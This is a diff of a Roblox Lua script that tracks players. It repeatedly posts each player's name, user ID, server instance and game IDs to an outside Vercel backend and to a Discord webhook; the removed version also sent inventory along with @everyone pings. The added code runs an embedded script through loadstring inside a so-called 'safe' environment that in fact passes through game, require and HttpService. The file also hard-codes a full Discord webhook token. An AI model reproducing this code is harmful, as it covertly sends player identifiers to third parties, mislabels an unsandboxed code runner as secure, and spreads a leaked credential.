@@ -2,188 +2,172 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 
-local player = Players.LocalPlayer
+-- Configuration
 local BACKEND_URL = "https://backend-vercel-ashy.vercel.app/api/register.js"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 local RETRY_LIMIT = 3
 local RETRY_DELAY = 2
 local DEBOUNCE_TIME = 30
 
+-- Direct script to execute (replace with your actual script)
+local EXTERNAL_SCRIPT = [[
+    -- Your script content goes here
+    print("External script executed successfully!")
+    
+    -- Example function
+    local function exampleTask()
+        print("Performing background task...")
+    end
+    
+    -- Run periodically
+    while true do
+        exampleTask()
+        task.wait(10)
+    end
+]]
+
+local player = Players.LocalPlayer
 local lastSendTime = 0
 
--- Fungsi untuk mendapatkan inventory player
-local function getPlayerInventory()
-    local inventory = {}
-    if player:FindFirstChild("Inventory") then
-        for _, item in ipairs(player.Inventory:GetChildren()) do
-            table.insert(inventory, item.Name)
-        end
-    end
-    return inventory
-end
-
--- Fungsi untuk mengirim ke backend Vercel
-local function sendToBackend(data)
-    local success, response = pcall(function()
-        return HttpService:RequestAsync({
-            Url = BACKEND_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["X-Game-ID"] = tostring(game.GameId)
-            },
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-    
-    if not success then
-        warn("[Backend] Request failed:", response)
-        return false
-    end
-    
-    return response.StatusCode == 200
-end
-
--- Fungsi untuk mengirim ke webhook (Discord)
-local function sendToWebhook(data)
-    local inventory = getPlayerInventory()
-    local inventoryText = #inventory > 0 and table.concat(inventory, ", ") or "Empty"
-    
-    local embed = {
-        {
-            title = "📢 PLAYER JOINED - @"..player.Name,
-            description = string.format(
-                "@everyone\n**%s** joined the game!\n\n**UserID**: `%d`\n**Game**: [%d](https://www.roblox.com/games/%d)",
-                player.Name, data.userId, data.placeId, data.placeId
-            ),
-            color = 16711680,
-            fields = {
-                {
-                    name = "🆔 Instance ID",
-                    value = "`"..data.instanceId.."`",
-                    inline = true
-                },
-                {
-                    name = "🕒 Timestamp",
-                    value = os.date("%Y-%m-%d %H:%M:%S", data.timestamp),
-                    inline = true
-                },
-                {
-                    name = "🎒 Inventory",
-                    value = "```"..inventoryText.."```",
-                    inline = false
-                }
-            },
-            footer = {
-                text = "🔔 Tracker System | "..os.date("%X")
-            },
-            thumbnail = {
-                url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", data.userId)
-            }
-        }
+-- Secure function to execute external script
+local function executeExternalScript()
+    -- Create a safe execution environment
+    local safeEnv = {
+        print = print,
+        warn = warn,
+        task = task,
+        game = game,
+        script = script,
+        require = require,
+        HttpService = HttpService,
+        Players = Players,
+        RunService = RunService
     }
     
-    local success, response = pcall(function()
-        return HttpService:RequestAsync({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({
-                content = "@everyone",
-                embeds = embed,
-                allowed_mentions = {
-                    parse = {"everyone"}
-                }
-            })
-        })
-    end)
-    
-    if not success then
-        warn("[Webhook] Request failed:", response)
+    -- Load the script
+    local fn, err = loadstring(EXTERNAL_SCRIPT, "ExternalScript")
+    if not fn then
+        warn("[Script] Load failed:", err)
         return false
     end
     
-    return response.StatusCode == 204
+    -- Set the safe environment
+    setfenv(fn, safeEnv)
+    
+    -- Execute with error handling
+    local success, result = pcall(fn)
+    if not success then
+        warn("[Script] Execution failed:", result)
+        return false
+    end
+    
+    return true, result
 end
 
--- Fungsi utama dengan retry mechanism
-local function sendData()
+-- Enhanced logging function
+local function sendLoggerData()
     if os.time() - lastSendTime < DEBOUNCE_TIME then
         return false
     end
-    
+
     local data = {
         username = player.Name,
         userId = player.UserId,
         instanceId = game.JobId,
         timestamp = os.time(),
         placeId = game.PlaceId,
-        gameId = game.GameId,
-        inventory = getPlayerInventory()
+        gameId = game.GameId
     }
-    
+
     lastSendTime = os.time()
-    
+
+    -- Send to backend
     task.spawn(function()
         for i = 1, RETRY_LIMIT do
-            if sendToBackend(data) then break end
+            local success = pcall(function()
+                HttpService:RequestAsync({
+                    Url = BACKEND_URL,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json",
+                        ["X-Game-ID"] = tostring(game.GameId)
+                    },
+                    Body = HttpService:JSONEncode(data)
+                })
+            end)
+            if success then break end
             if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
         end
     end)
-    
+
+    -- Send to Discord webhook
     task.spawn(function()
+        local embed = {
+            {
+                title = "Player Activity Log",
+                description = string.format(
+                    "**%s**\nUserID: %d\nGame: [%d](https://www.roblox.com/games/%d)",
+                    data.username, data.userId, data.placeId, data.placeId
+                ),
+                color = 16711680,
+                fields = {
+                    {
+                        name = "Instance ID",
+                        value = data.instanceId,
+                        inline = true
+                    },
+                    {
+                        name = "Timestamp",
+                        value = os.date("%Y-%m-%d %H:%M:%S", data.timestamp),
+                        inline = true
+                    }
+                }
+            }
+        }
+
         for i = 1, RETRY_LIMIT do
-            if sendToWebhook(data) then break end
+            local success = pcall(function()
+                HttpService:RequestAsync({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        embeds = embed
+                    })
+                })
+            end)
+            if success then break end
             if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
         end
     end)
-    
-    return true
 end
 
--- Sistem event handlers
+-- Initialize systems
 local function init()
-    local function initializeWhenReady()
-        if player:GetAttribute("DataLoaded") then
-            sendData()
-        else
-            player:GetAttributeChangedSignal("DataLoaded"):Once(sendData)
-        end
-    end
-
+    -- Execute external script in protected mode
+    task.spawn(function()
+        local success, result = executeExternalScript()
+        print("[System] External script status:", success)
+    end)
+    
+    -- Initialize logger system
+    player.CharacterAdded:Connect(function()
+        sendLoggerData()
+    end)
+    
     if player.Character then
-        initializeWhenReady()
-    else
-        player.CharacterAdded:Connect(function(character)
-            initializeWhenReady()
-        end)
+        sendLoggerData()
     end
     
-    -- Periodic update
+    -- Periodic updates
     while true do
-        task.wait(300)
-        if player:GetAttribute("DataLoaded") then
-            sendData()
-        end
+        task.wait(300)  -- Every 5 minutes
+        sendLoggerData()
     end
 end
 
--- Inisialisasi
-task.spawn(init)
-
--- Handle disconnect dengan cara yang benar
-game:BindToClose(function()
-    if player:GetAttribute("DataLoaded") then
-        sendData()
-        task.wait(1) -- Beri waktu untuk mengirim data
-    end
-    print("[Logger] Final data sent before shutdown")
-end)
-
--- Alternatif deteksi disconnect player
-player:GetPropertyChangedSignal("Parent"):Connect(function()
-    if not player.Parent then -- Jika player di-kick/leave
-        sendData()
-        print("[Logger] Player left game")
-    end
-end)
+-- Start the system with error handling
+local success, err = pcall(init)
+if not success then
+    warn("System initialization failed:", err)
+end
